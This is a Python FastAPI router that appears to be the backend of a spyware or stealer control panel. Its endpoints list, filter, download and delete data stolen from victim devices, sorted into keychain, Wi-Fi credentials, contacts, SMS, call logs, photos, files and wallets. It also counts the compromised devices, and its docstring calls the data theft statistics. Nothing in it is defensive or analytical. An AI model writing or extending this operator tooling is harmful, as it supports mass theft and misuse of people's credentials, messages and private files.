from fastapi import APIRouter, Depends, HTTPException, Query, Request
from fastapi.responses import FileResponse
from sqlalchemy.orm import Session
from sqlalchemy import desc
from pathlib import Path
from ..database import get_db, ExfilData, create_audit_log
from ..auth import get_current_user
from ..schemas import ExfilDataResponse
from .notifications import broadcast_notification_sync
from ..limiter import rate_limit
from typing import Optional, List

router = APIRouter(prefix="/api/exfil", tags=["exfil"], redirect_slashes=False)

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent


@router.get("/stats")
async def get_exfil_stats(
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    """获取数据窃取统计信息"""
    categories = ['keychain', 'wifi', 'contacts', 'sms', 'calls', 'photos', 'files', 'wallet']
    
    stats = {}
    for cat in categories:
        count = db.query(ExfilData).filter(ExfilData.category == cat).count()
        stats[cat] = count
    
    total = db.query(ExfilData).count()
    devices = db.query(ExfilData.device_uuid).distinct().count()
    
    return {
        "total": total,
        "devices": devices,
        "by_category": stats
    }


@router.get("")
async def get_exfil_data(
    skip: int = 0,
    limit: int = 100,
    device_uuid: str = None,
    category: str = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid == device_uuid)
    if category:
        query = query.filter(ExfilData.category == category)
    total = query.count()
    items = query.offset(skip).limit(limit).all()
    return {"total": total, "items": items}


@router.get("/keychain")
async def get_keychain(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    account: Optional[str] = None,
    service: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'keychain').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/wifi")
async def get_wifi(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    ssid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'wifi').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/contacts")
async def get_contacts(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    name: Optional[str] = None,
    phone: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'contacts').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/sms")
async def get_sms(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    phone: Optional[str] = None,
    type: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'sms').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/calls")
async def get_calls(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    phone: Optional[str] = None,
    type: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'calls').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/photos")
async def get_photos(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'photos').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/files")
async def get_files(
    skip: int = Query(0, ge=0),
    limit: int = Query(20, ge=1, le=100),
    device_uuid: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(ExfilData).filter(ExfilData.category == 'files').order_by(desc(ExfilData.uploaded_at))
    if device_uuid:
        query = query.filter(ExfilData.device_uuid.contains(device_uuid))
    return query.offset(skip).limit(limit).all()


@router.get("/{exfil_id}", response_model=ExfilDataResponse)
async def get_exfil_item(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    exfil = db.query(ExfilData).filter(ExfilData.id == exfil_id).first()
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil data not found")
    return exfil


@router.get("/{exfil_id}/download")
async def download_exfil(exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    exfil = db.query(ExfilData).filter(ExfilData.id == exfil_id).first()
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil data not found")
    
    file_path = Path(exfil.file_path)
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(str(file_path), filename=file_path.name)


@rate_limit("10/minute")
@router.delete("/{exfil_id}")
async def delete_exfil(request: Request, exfil_id: int, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    exfil = db.query(ExfilData).filter(ExfilData.id == exfil_id).first()
    if not exfil:
        raise HTTPException(status_code=404, detail="Exfil data not found")

    file_path = Path(exfil.file_path)
    if file_path.exists():
        file_path.unlink()

    db.delete(exfil)
    db.commit()

    username = current_user.username if current_user else "anonymous"
    create_audit_log(
        db, username=username, action="exfil_delete", resource_type="exfil",
        resource_id=exfil_id, detail=f"Deleted exfil data {exfil_id} (category: {exfil.category}, device: {exfil.device_uuid})",
        ip_address=request.client.host if request.client else None
    )
    return {"message": "Exfil data deleted"}
